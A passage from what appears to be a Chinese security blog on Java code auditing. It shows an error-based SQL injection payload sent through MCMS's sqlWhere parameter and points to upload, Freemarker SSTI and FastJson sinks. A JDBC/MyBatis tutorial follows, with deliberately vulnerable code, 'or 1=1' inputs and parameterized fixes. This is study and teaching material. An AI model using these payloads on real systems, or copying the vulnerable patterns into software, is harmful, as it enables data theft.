class="line"><span class="comment"> * 查询分类列表接口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> category 栏目实体</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;查询分类列表接口&quot;)</span></span><br><span class="line"><span class="meta">@ApiImplicitParams(&#123;</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name = &quot;categoryTitle&quot;, value = &quot;栏目管理名称&quot;, required =false,paramType=&quot;query&quot;),</span></span><br><span class="line"><span class="meta">    @ApiImplicitParam(name = &quot;categoryParentId&quot;, value = &quot;父类型编号&quot;, required =false,paramType=&quot;query&quot;),</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/list&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;cms:category:view&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">list</span><span class="params">(<span class="meta">@ModelAttribute</span> <span class="meta">@ApiIgnore</span> CategoryEntity category)</span> &#123;</span><br><span class="line">BasicUtil.startPage();</span><br><span class="line"><span class="type">List</span> <span class="variable">categoryList</span> <span class="operator">=</span> categoryBiz.query(category);</span><br><span class="line"><span class="keyword">return</span> ResultData.build().success(<span class="keyword">new</span> <span class="title class_">EUListBean</span>(categoryList,(<span class="type">int</span>) BasicUtil.endPage(categoryList).getTotal()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 CategoryEntity 分析其结构，进一步找 又跟进到BaseEntity找<code>qlWhereList</code>和<code>SQLwhere</code>，SQLwhere是json格式，分析可能存在注入点。<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-6.png" alt="抓包分析"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categoryType=1&amp;sqlWhere=%5B%7B%22action%22%3A%22and%22%2C%22field%22%3A%22content_title%22%2C%22el%22%3A%22eq%22%2C%22model%22%3A%22contentTitle%22%2C%22name%22%3A%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22%2C%22type%22%3A%22input%22%2C%22value%22%3A%2212312313%22%7D%5D&amp;pageNo=1&amp;pageSize=10</span><br><span class="line">url解码之后:</span><br><span class="line">categoryType=1&amp;sqlWhere=[&#123;&quot;action&quot;:&quot;and&quot;,&quot;field&quot;:&quot;content_title&quot;,&quot;el&quot;:&quot;eq&quot;,&quot;model&quot;:&quot;contentTitle&quot;,&quot;name&quot;:&quot;文章标题&quot;,&quot;type&quot;:&quot;input&quot;,&quot;value&quot;:&quot;12312313&quot;&#125;]&amp;pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure><p><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-7.png" alt="IDEA里面也有输出"><br>接下来尝试使用报错语句查询:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categoryType=1&amp;sqlWhere=[&#123;&quot;action&quot;:&quot;and&quot;,&quot;field&quot;:&quot;updatexml(1,concat(0x7e,(select user()),0x7e),1)&quot;,&quot;el&quot;:&quot;eq&quot;,&quot;model&quot;:&quot;contentTitle&quot;,&quot;name&quot;:&quot;文章标题&quot;,&quot;type&quot;:&quot;input&quot;,&quot;value&quot;:&quot;12312313&quot;&#125;]&amp;pageNo=1&amp;pageSize=10</span><br><span class="line"></span><br><span class="line">categoryType=1&amp;sqlWhere=%5B%7B%22action%22:%22and%22,%22field%22:%22updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%22,%22el%22:%22eq%22,%22model%22:%22contentTitle%22,%22name%22:%22%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98%22,%22type%22:%22input%22,%22value%22:%2212312313%22%7D%5D&amp;pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure><p><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-8.png" alt="注入结果"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>模板位置上传<br>&#x2F;ms&#x2F;file&#x2F;uploadTemplate.do</p><h2 id="SSTI：Freemarker模板注入"><a href="#SSTI：Freemarker模板注入" class="headerlink" title="SSTI：Freemarker模板注入"></a>SSTI：Freemarker模板注入</h2><p>源码位置net\mingsoft\base\util\FtlUtil.java</p><h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson &lt;&#x3D;1.2.80 反序列化"></a>FastJson &lt;&#x3D;1.2.80 反序列化</h2><p>net&#x2F;mingsoft&#x2F;basic&#x2F;action&#x2F;web&#x2F;EditorAction.javaMap&lt;String, Object&gt; map &#x3D; (Map&lt;String, Object&gt;) JSONObject.parse(jsonConfig); &#x2F;&#x2F;直接解析了jsonConfig</p><p>URL：@RequestMapping(“&#x2F;static&#x2F;plugins&#x2F;ueditor&#x2F;{version}&#x2F;jsp”)，需要version</p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java代码审计SQL注入</title>
      <link href="/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/"/>
      <url>/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/</url>
      
        <content type="html"><![CDATA[<h2 id="JDBC-拼接不当造成-SQL-注入"><a href="#JDBC-拼接不当造成-SQL-注入" class="headerlink" title="JDBC 拼接不当造成 SQL 注入"></a>JDBC 拼接不当造成 SQL 注入</h2><h3 id="1-JDBC的两种SQL执行方法：Statement-vs-PrepareStatement"><a href="#1-JDBC的两种SQL执行方法：Statement-vs-PrepareStatement" class="headerlink" title="1. JDBC的两种SQL执行方法：Statement vs PrepareStatement"></a>1. JDBC的两种SQL执行方法：<code>Statement</code> vs <code>PrepareStatement</code></h3><p>在JDBC中，有两种常用的执行SQL语句的方法：<code>Statement</code>和<code>PrepareStatement</code>。</p><ul><li><p><strong>Statement</strong>：</p><ul><li><code>Statement</code>是直接拼接SQL语句执行的，每次执行时都需要对SQL语句重新进行编译，开销较大。</li><li>不安全，容易受到SQL注入攻击的影响，因为用户输入的内容可以直接插入到SQL语句中并执行。</li></ul></li><li><p><strong>PrepareStatement</strong>：</p><ul><li><code>PrepareStatement</code>会对SQL语句进行预编译，效率更高，安全性更好。</li><li>支持参数化查询，使用<code>?</code>作为占位符，将用户输入的参数作为独立的元素传递给数据库，可以防止SQL注入。</li><li>然而，如果开发者使用<code>PrepareStatement</code>时仍采用字符串拼接的方式构建SQL语句，则仍然存在SQL注入风险。</li></ul></li></ul><h3 id="2-使用Statement拼接SQL语句的示例与分析"><a href="#2-使用Statement拼接SQL语句的示例与分析" class="headerlink" title="2. 使用Statement拼接SQL语句的示例与分析"></a>2. 使用<code>Statement</code>拼接SQL语句的示例与分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.jdbcinjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/jdbcsql&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcDynamicController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;spring.datasource.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/dynamic&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdbcdynamic</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException&#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rsUsername</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">rsPassword</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, rsUsername, rsPassword);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        conn.close();</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/05/WebSecurity/codeaudit/javacodesqlinjection/image.png"><br>我在数据库里使用下面语句创建了数据库插入了一些模拟数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> java;</span><br><span class="line">USE java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">user</span> (</span><br><span class="line">    id <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (id, username, password) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;user1&#x27;</span>, <span class="string">&#x27;password1&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;user2&#x27;</span>, <span class="string">&#x27;password2&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;user3&#x27;</span>, <span class="string">&#x27;password3&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>SQL注入分析</strong>：<ul><li><code>req.getParameter(&quot;id&quot;)</code>获取了用户输入的参数，直接拼接到<code>sql</code>语句中。</li><li>如果用户输入<code>1%27%20or%201=1%23</code>作为<code>id</code>参数，SQL语句将变成：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li><li>这个条件<code>1=1</code>恒为真，因此数据库将返回所有用户信息，导致信息泄露。</li></ul></li></ul><h3 id="3-PrepareStatement的错误用法示例"><a href="#3-PrepareStatement的错误用法示例" class="headerlink" title="3. PrepareStatement的错误用法示例"></a>3. <code>PrepareStatement</code>的错误用法示例</h3><p>即使使用了<code>PrepareStatement</code>，如果开发者将用户输入通过拼接方式插入到SQL语句中，仍然会出现SQL注入问题。以下代码展示了这种错误用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = &quot;</span> + req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">out.println(sql);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; id: &quot;</span> + rs.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; name: &quot;</span> + rs.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>问题分析</strong>：<ul><li>这里虽然使用了<code>PreparedStatement</code>，但<code>sql</code>语句仍然通过拼接构造。这意味着在SQL执行前，用户的输入已经插入到SQL语句中。</li><li>用户仍然可以通过输入类似<code>1 OR 1=1</code>的字符串来注入SQL，导致和上例相同的风险。</li></ul></li></ul><h3 id="4-正确使用PrepareStatement避免SQL注入"><a href="#4-正确使用PrepareStatement避免SQL注入" class="headerlink" title="4. 正确使用PrepareStatement避免SQL注入"></a>4. 正确使用<code>PrepareStatement</code>避免SQL注入</h3><p>正确的方式是使用<code>?</code>作为占位符，并在执行SQL时将用户输入的参数绑定到占位符上。<code>PrepareStatement</code>会对每个参数的类型和内容进行严格检查，避免将用户输入当作SQL语句的一部分来解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id = ?&quot;</span>;</span><br><span class="line">out.println(sql);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">    pstt.setInt(<span class="number">1</span>, Integer.parseInt(req.getParameter(<span class="string">&quot;id&quot;</span>))); <span class="comment">// 使用占位符并绑定参数</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; id: &quot;</span> + rs.getObject(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">        out.println(<span class="string">&quot;&lt;br&gt; name: &quot;</span> + rs.getObject(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MyBatis-框架代码注入"><a href="#MyBatis-框架代码注入" class="headerlink" title="MyBatis 框架代码注入"></a>MyBatis 框架代码注入</h2><h3 id="1-MyBatis-框架的简介"><a href="#1-MyBatis-框架的简介" class="headerlink" title="1. MyBatis 框架的简介"></a>1. MyBatis 框架的简介</h3><p>MyBatis 是一种将 SQL 语句嵌入到 XML 配置文件中的持久层框架，它通过将 SQL 语句和 Java 代码分离，使 SQL 语句的管理更加直观、易于修改，同时支持 SQL 参数化查询。这一特点可以在一定程度上提高 SQL 安全性，但也可能引入新的安全隐患，特别是在不正确使用 <code>#&#123;&#125;</code> 和 <code>$&#123;&#125;</code> 占位符的情况下。</p><h3 id="2-MyBatis-中的两种-SQL-参数传递方式：-和"><a href="#2-MyBatis-中的两种-SQL-参数传递方式：-和" class="headerlink" title="2. MyBatis 中的两种 SQL 参数传递方式：#{} 和 ${}"></a>2. MyBatis 中的两种 SQL 参数传递方式：<code>#&#123;&#125;</code> 和 <code>$&#123;&#125;</code></h3><p>在 MyBatis 中，开发者可以通过 <code>#&#123;&#125;</code> 和 <code>$&#123;&#125;</code> 两种方式传递参数：</p><ul><li><p>**<code>#&#123;Parameter&#125;</code>**：使用 <code>#&#123;&#125;</code> 传参的方式会自动将参数替换为 SQL 中的占位符 <code>?</code>，并在执行时进行预编译。因此，参数作为独立数据传入 SQL 执行环境，不会被解析为 SQL 的一部分。</p><ul><li>这种方式是参数化查询的安全方式，有效防止 SQL 注入。</li><li>例如：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsername&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, name, age FROM user WHERE name = #&#123;name&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>执行过程</strong>：<ul><li>当用户输入 <code>name = &quot;z1ng&quot;</code> 时，MyBatis 会将其转换为 SQL 查询：<code>SELECT id, name, age FROM user WHERE name = ?</code></li><li>在数据库执行时，<code>z1ng</code> 会作为参数绑定到 SQL 中的 <code>?</code>，防止 SQL 注入。</li></ul></li></ul></li><li><p>**<code>$&#123;Parameter&#125;</code>**：使用 <code>$&#123;&#125;</code> 传参的方式会直接将参数值拼接到 SQL 语句中，而不会经过预编译。这意味着参数会被解析为 SQL 语句的一部分，容易产生 SQL 注入风险。</p><ul><li><strong>不安全的方式</strong>，不建议用于直接处理用户输入的变量。</li><li>例如：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsername&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.z1ng.bean.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, name, age FROM user WHERE name = $&#123;name&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>执行过程</strong>：<ul><li>当用户输入 <code>name = &quot;&#39;aaaa&#39; OR 1=1&quot;</code> 时，MyBatis 会将其直接拼接到 SQL 中，生成 <code>SELECT id, name, age FROM user WHERE name = &#39;aaaa&#39; OR 1=1</code>。</li><li>由于 <code>OR 1=1</code> 始终为真，SQL 语句将返回所有数据，从而导致 SQL 注入。</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">orderbyInjection</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span>;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user where id in ($&#123;params&#125;)&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">inInjection</span><span class="params">(<span class="meta">@Param(&quot;params&quot;)</span>String params)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">likeInjection</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line"><span class="comment">//Mybatis查询SQL语句的另一种使用注解方式，这也是存在SQL注入的。</span></span><br><span class="line"><span class="comment">//@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line"><span class="comment">//List&lt;User&gt; likeInjection(@Param(&quot;username&quot;) String username);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.sqlinjection.mybatisinjection.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">&quot;com.example.sqlinjection.mybatisinjection.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.Integer&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;NUMERIC&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbyInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from user order by $&#123;sort&#125; asc</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;likeInjection&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from user where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-SQL-注入风险分析"><a href="#3-SQL-注入风险分析" class="headerlink" title="3. SQL 注入风险分析"></a>3. SQL 注入风险分析</h3><h4 id="使用-的安全性"><a href="#使用-的安全性" class="headerlink" title="使用 #{} 的安全性"></a>使用 <code>#&#123;&#125;</code> 的安全性</h4><ul><li>当我们在 MyBatis 中使用 <code>#&#123;&#125;</code> 传参时，MyBatis 会将参数转换为 SQL 语句的 <code>?</code> 占位符，并在执行时绑定实际的参数值。这种方式确保了用户输入和 SQL 语句的分离，因此即使用户输入恶意数据，也不会对 SQL 语句的逻辑产生影响。</li><li>例如，当用户输入 <code>name = &quot;z1ng&#39; OR &#39;1&#39;=&#39;1&quot;</code>，SQL 语句将是：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, age <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure>在执行时，数据库会将 <code>name</code> 作为参数来处理，而不会改变 SQL 语句本身，从而有效防止了 SQL 注入。</li></ul><h4 id="使用-的-SQL-注入风险"><a href="#使用-的-SQL-注入风险" class="headerlink" title="使用 ${} 的 SQL 注入风险"></a>使用 <code>$&#123;&#125;</code> 的 SQL 注入风险</h4><ul><li>直接拼接用户输入的字符串会让 SQL 语句变得极其脆弱，用户可以通过恶意构造的输入来操纵查询逻辑。</li><li>例如，在 MyBatis 中，如果使用 <code>$&#123;name&#125;</code>，则输入 <code>&quot;z1ng&#39; OR &#39;1&#39;=&#39;1&quot;</code> 会使 SQL 语句变为：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name, age <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;z1ng&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>SQL 语句的逻辑已被篡改，将查询所有数据，从而导致数据泄露。</li></ul></li></ul><h3 id="6-MyBatis-使用中的安全建议"><a href="#6-MyBatis-使用中的安全建议" class="headerlink" title="6. MyBatis 使用中的安全建议"></a>6. MyBatis 使用中的安全建议</h3><h4 id="6-1-避免在动态-SQL-中直接使用"><a href="#6-1-避免在动态-SQL-中直接使用" class="headerlink" title="6.1 避免在动态 SQL 中直接使用 ${}"></a>6.1 避免在动态 SQL 中直接使用 <code>$&#123;&#125;</code></h4><ul><li>MyBatis 支持动态 SQL（如 <code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>、<code>&lt;where&gt;</code> 等标签），在构建动态 SQL 时也需要特别小心，避免使用 <code>$&#123;&#125;</code> 来插入用户输入。</li><li>例如，在 MyBatis 的动态查询中使用 